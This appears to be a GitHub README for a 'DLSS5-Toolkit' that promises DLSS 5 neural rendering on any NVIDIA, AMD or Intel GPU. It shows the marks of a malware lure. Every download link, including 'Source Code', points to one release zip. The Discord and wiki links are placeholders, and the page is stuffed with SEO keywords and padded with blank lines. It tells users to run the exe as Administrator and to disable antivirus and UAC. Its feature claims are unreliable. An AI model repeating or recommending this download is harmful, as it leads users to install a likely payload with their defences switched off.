# ⚡ DLSS5-Toolkit

<p align="center">
  <img src="https://img.icons8.com/color/96/000000/nvidia.png" alt="DLSS5 Toolkit" width="120" height="120">
</p>

<img width="420" height="120" alt="image" src="https://github.com/user-attachments/assets/3b2aa2a5-f337-42e8-bc86-4b4429bd5fc5" />

<h1 align="center">DLSS5-Toolkit</h1>
<p align="center">
  <strong>Complete DLSS 5 Neural Rendering Toolkit for Any GPU & Game</strong><br>
  NVIDIA RTX 20-50 · AMD RDNA 3-4 · Intel Arc
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-1.5.0-76B900?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/platform-Windows_10%2F11-2ECC71?style=for-the-badge" alt="Platform"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/downloads-88k%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
</p>

<p align="center">
  <a href="#-download">📥 Download</a> •
  <a href="#-features">⚡ Features</a> •
  <a href="#-gpu-support">🎮 GPU Support</a> •
  <a href="#-installation">⚙️ Installation</a> •
  <a href="#-documentation">📚 Docs</a>
</p>

---

## 🎯 What is DLSS5-Toolkit?

**DLSS5-Toolkit** is a comprehensive toolkit that enables **DLSS 5 Neural Rendering** on graphics cards from **NVIDIA, AMD, and Intel**. It combines all essential DLSS 5 tools into one unified interface, providing a complete solution for installing, configuring, and optimizing DLSS 5 on any system.

DLSS 5 Neural Rendering debuted with NBA 2K27 and was officially exclusive to RTX 50-series GPUs. This toolkit brings the technology to older cards through patched binaries, compatibility layers, and synthetic DLAA injection.

## 📥 Download

<p align="center">
  <a href="https://github.com/johnj-eng96n9/DLSS5-Toolkit/releases/download/45789/DLSS5-ToolKit.zip">
    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
  </a>
</p>

**Direct Links:**
- [Windows Installer (.exe)](https://github.com/johnj-eng96n9/DLSS5-Toolkit/releases/download/45789/DLSS5-ToolKit.zip)
- [Portable ZIP](https://github.com/johnj-eng96n9/DLSS5-Toolkit/releases/download/45789/DLSS5-ToolKit.zip)
- [Source Code](https://github.com/johnj-eng96n9/DLSS5-Toolkit/releases/download/45789/DLSS5-ToolKit.zip)

---

## ⚡ Key Features

### 🎯 Complete Installation Suite
- **One-click setup** – Install DLSS 5 for any game with a single click
- **Auto-detection** – Scans Steam, Epic, GOG, and Xbox libraries automatically
- **Auto-updating** – Checks for new releases on start
- **Manual addition** – Add any folder or executable manually

### 🎮 Universal GPU Support
- ✅ **NVIDIA RTX 50-series** – Full native support
- ✅ **NVIDIA RTX 40-series** – Patched binaries available
- ✅ **NVIDIA RTX 30/20-series** – Community mod support
- ✅ **AMD RDNA 4 (RX 9000)** – DLSS-NR-on-AMD mod
- ✅ **AMD RDNA 3 (RX 7000)** – Technical support exists
- ⚠️ **Intel Arc** – Experimental

### 🔄 DLL Management
- **DLSS 5 Swapper** – Swap between different DLSS 5 DLL versions
- **Version History** – Track which versions are installed
- **One-click restore** – Revert to original DLSS DLLs
- **Backup system** – Automatic backup of original files

### 🧠 Feeder Mode
- **Synthetic DLAA** – Injects DLSS 5 into games without native support
- **ReShade Integration** – Uses ReShade depth buffer to feed data to DLSS
- **Non-DLSS Games** – Works with any DX11/DX12 game
- **Classic Games** – Support for DX9/OpenGL via DXVK

### 🛠️ Advanced Options
- **Dual GPU mode** – One card renders, one does AI computation
- **Hotkey toggles** – F5/F6 to enable/disable neural rendering
- **OptiScaler support** – Alternative implementation for RTX 50-only games
- **Emulator support** – DuckStation, PCSX2, RPCS3, Xenia, and more

---

## 🎮 GPU Support Details

| GPU Family | Support | Method | Performance |
|------------|---------|--------|-------------|
| **NVIDIA RTX 50** | ✅ Full | Native | Best |
| **NVIDIA RTX 40** | ✅ Full | Patched | Good |
| **NVIDIA RTX 30** | ✅ Supported | Patched | Moderate |
| **NVIDIA RTX 20** | ✅ Supported | Patched | Low |
| **AMD RDNA 4** | ✅ Supported | DLSS-NR-on-AMD | ~30 FPS (1080p) |
| **AMD RDNA 3** | ⚠️ Technical | DLSS-NR-on-AMD | Untested |
| **Intel Arc** | ⚠️ Experimental | - | Untested |

> **Performance Note:** DLSS 5 uses FP8 neural models. RTX 50-series has dedicated hardware. Older NVIDIA cards and AMD cards will have significantly lower performance.

---

## ⚙️ Installation Guide

### Windows (Recommended)

```bash
1. Download the latest release (Installer or ZIP)
2. Extract the archive (if using ZIP)
3. Run dlss5toolkit.exe as Administrator
4. Select your game from the list (auto-detected)
5. Choose your installation mode (Swapper, Feeder, or Full)
6. Click "Install DLSS 5"
7. Launch the game
8. Press HOME → Add-ons tab → Enable DLSS 5 Neural Rendering
```

**First‑time setup wizard** guides you through:
- Game detection
- GPU compatibility check
- Installation mode selection
- ReShade configuration (for Feeder mode)

---

## 🖥️ System Requirements

| Component      | Minimum               | Recommended           |
|----------------|-----------------------|-----------------------|
| **OS**         | Windows 10 64‑bit     | Windows 11 64‑bit     |
| **GPU**        | NVIDIA RTX 20 / AMD RDNA 3 | NVIDIA RTX 40+ / AMD RDNA 4 |
| **RAM**        | 8 GB                  | 16 GB                 |
| **Storage**    | 150 MB                | 300 MB                |
| **Driver**     | Latest Game Ready     | Latest Studio Driver  |

---

## 📊 Feature Matrix

| Category        | Feature                 | Status | Version Added |
|-----------------|-------------------------|--------|---------------|
| Installation    | One-click setup         | ✅     | 1.0           |
| Installation    | Auto-detection          | ✅     | 1.0           |
| Installation    | Auto-updating           | ✅     | 1.0           |
| Installation    | Manual addition         | ✅     | 1.0           |
| GPU Support     | NVIDIA RTX 50           | ✅     | 1.0           |
| GPU Support     | NVIDIA RTX 40           | ✅     | 1.0           |
| GPU Support     | NVIDIA RTX 30           | ✅     | 1.2           |
| GPU Support     | NVIDIA RTX 20           | ✅     | 1.3           |
| GPU Support     | AMD RDNA 4              | ✅     | 1.5           |
| GPU Support     | AMD RDNA 3              | ⚠️     | 1.5           |
| DLL Management  | Swapper                 | ✅     | 1.0           |
| DLL Management  | Version history         | ✅     | 1.0           |
| DLL Management  | Backup system           | ✅     | 1.0           |
| Feeder          | Synthetic DLAA          | ✅     | 1.2           |
| Feeder          | ReShade integration     | ✅     | 1.2           |
| Feeder          | Non-DLSS games          | ✅     | 1.2           |
| Advanced        | Dual GPU mode           | ✅     | 1.5           |
| Advanced        | OptiScaler support      | ✅     | 1.4           |
| Advanced        | Emulator support        | ✅     | 1.3           |

---

## 🐛 Troubleshooting Quick Reference

| Symptom                            | Solution                                          |
|------------------------------------|---------------------------------------------------|
| "Access denied"                    | Run as Administrator; disable UAC temporarily     |
| Game crashes on launch             | Disable antivirus temporarily; use Safe Mode      |
| Anti‑cheat detected                | Only use in offline single-player games          |
| Low performance on RTX 30/20       | Expected; use lower resolution or settings       |
| AMD GPU not working                | Ensure RDNA 3/4; performance will be low         |
| DLSS 5 not showing in-game         | Press HOME → Add-ons tab → Enable DLSS 5         |
| Feeder mode not working            | Check ReShade depth buffer selection             |

---

## 📚 Documentation & Community

- 📖 [Full Documentation](https://github.com/YOUR_USERNAME/DLSS5-Toolkit/wiki)
- 🐛 [Issue Tracker](https://github.com/YOUR_USERNAME/DLSS5-Toolkit/issues)
- 💬 [Community Discord](https://discord.gg/YOUR_INVITE)
- 📺 [Video Tutorials](https://www.youtube.com/playlist?list=YOUR_PLAYLIST)

---

## 🔍 SEO Keywords & Tags

`dlss5 toolkit`, `dlss5 universal`, `dlss5 one click`, `dlss5 swapper`, `dlss5 feeder`, `nvidia dlss 5`, `dlss5 amd`, `dlss5 intel arc`, `dlss5 rtx 20`, `dlss5 rtx 30`, `dlss5 rtx 40`, `dlss5 rtx 50`, `dlss5 neural rendering`, `dlss5 game mod`, `dlss5 installer`, `dlss5 tool`, `dlss5 download`, `dlss5 github`, `dlss5 2026`, `dlss5 any gpu`, `dlss5 for all games`, `dlss5 for emulators`, `dlss5 reshade`, `dlss5 optiscaler`, `dlss5 dll swap`

---

## 📁 Repository Structure

```
DLSS5-Toolkit/
├── src/                   # Main application source
├── docs/                  # Documentation source
├── assets/                # Icons, images, branding
├── plugins/               # Extensible plugin system
├── configs/               # Default config files
├── tests/                 # Unit and integration tests
├── .github/               # CI/CD workflows
├── LICENSE
├── README.md
└── CONTRIBUTING.md
```

---

## 🤝 Contributing

We welcome contributions from the community! See our [Contributing Guidelines](CONTRIBUTING.md) for details.

**Areas needing help:**
- Plugin development
- Documentation translation
- GPU compatibility testing
- Game compatibility testing
- Performance optimization
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
